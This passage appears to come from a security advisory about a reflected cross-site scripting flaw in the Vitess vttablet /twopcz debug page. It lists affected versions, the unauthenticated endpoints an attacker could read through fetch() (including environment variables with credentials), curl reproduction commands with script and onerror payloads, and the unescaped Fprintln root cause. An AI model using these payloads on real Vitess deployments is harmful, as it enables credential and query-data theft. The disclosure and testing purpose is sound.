multiplexed with gRPC/MySQL) | | **Attack Complexity** | Low (craft URL, send to operator) | | **Privileges Required** | None (default `acl` policy is allow-all) | | **User Interaction** | Required (operator must visit crafted URL) | | **Scope** | Changed (XSS chain reaction to other vttablet debug endpoints) | | **Confidentiality** | High (query text, env vars, expvar stats) | | **Integrity** | None (XSS itself doesn't change state) | | **Availability** | None (XSS itself doesn't disrupt service) | ### Affected versions (verified) All released versions are vulnerable. The fix lives only on `main`: | Tag | Released | `twopcz.go` line 185 | Status | |---|---|---|---| | v20.0.0 | 2024-06-27 | `fmt.Fprintln(w, msg)` | **BUGGY** | | v20.0.1 - v20.0.6 | 2024 | `fmt.Fprintln(w, msg)` | **BUGGY** | | v22.0.4 | 2026-02-27 | `fmt.Fprintln(w, msg)` | **BUGGY** | | v23.0.3, v23.0.4 | 2026-02 / 2026-05 | `fmt.Fprintln(w, msg)` | **BUGGY** | | v24.0.0, v24.0.1 | 2026-04 / 2026-05 | `fmt.Fprintln(w, msg)` | **BUGGY** | | **main** (`33a3c0fafe69`) | 2026-06-23 | `fmt.Fprintln(w, html.EscapeString(msg))` | **FIXED** | ### Sensitive data exposed via the same-origin XSS chain A successful XSS lands in the vttablet's origin. From there, the attacker can fetch (via `fetch()` from injected JavaScript) the following same-origin endpoints, all of which are unauthenticated by default: - `/twopcz` — in-flight 2PC transactions (query text, parameters, dtid) - `/queryz` — live query plans - `/querylogz` — recent queries with bound values - `/txlogz` — transactions - `/debug/env` — environment variables (may include MySQL creds, topology credentials, encryption keys) - `/debug/vars` — expvar stats - `/debug/pprof/*` — CPU/memory profiles (if enabled) ## Reproduction (independent, runnable PoC) The PoC is a self-contained Go HTTP server that replicates the buggy `twopczHandler` from Vitess v20.0.0 verbatim (using the same line-185 code). It runs on `127.0.0.1:15080` and returns the same response shape as the real Vitess endpoint. ```bash # 1) Build the PoC (Go 1.23+) cd /path/to/finding/CVE-pending-twopcz-xss go build -o /tmp/vitess-twopcz-poc ./poc.go # 2) Start the buggy server ADDR=127.0.0.1:15080 /tmp/vitess-twopcz-poc & # 3) Reproduce — Test 1: bare GET (no params) curl -sS -i "http://127.0.0.1:15080/twopcz" # → Content-Type: text/html; charset=utf-8, status 200 # 4) Test 2: XSS via Action param (URL-encode the script tag) curl -sS -i "http://127.0.0.1:15080/twopcz?Action=%3Cscript%3Ealert(1)%3C%2Fscript%3E&dtid=zz" # → Response body contains literal "(zz): completed." # → Browser executes the script as same-origin code # 5) Test 3: XSS via dtid param (attribute-context payload) curl -sS -i "http://127.0.0.1:15080/twopcz?Action=Demo&dtid=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E" # → Response body contains literal "" # → Browser fires the onerror handler as same-origin code # 6) Run the 3x automated runner (writes evidence/run-{1,2,3}.log) bash ./poc/run.sh ``` PoC result excerpt (from `evidence/run-1.log`): ``` --- Test 2: XSS via Action= --- HTTP/1.1 200 OK Content-Type: text/html; charset=utf-8 ...

WARNING: Actions on this page can jeopardize data integrity.

(zz): completed. PASS: payload reflected UNESCAPED (XSS exploitable in browser) ``` The PoC was run 3 times on the buggy server (all 3/3 PASS) and the same code is byte-identical to the v20.0.0 commit `8aeb274f6c8e` line 185. ## Root cause (technical detail) `go/vt/vttablet/tabletserver/twopcz.go` (v20.0.0 through v24.0.1): ```go // Line 185 fmt.Fprintln(w, msg) ``` `msg` is constructed earlier in the handler as: ```go msg := fmt.Sprintf("%s(%s): completed.", action, dtid) ``` with `action` and `dtid` coming from the form values `r.FormValue("Action")` and `r.FormValue("dtid")`. The form values are URL-decoded (so a `+` becomes a space, `%3C` becomes `<`) but never HTML-escaped. The handler explicitly sets `Content-Type: text/html; charset=utf-8` (via the `` it writes first), so the browser executes any injected `
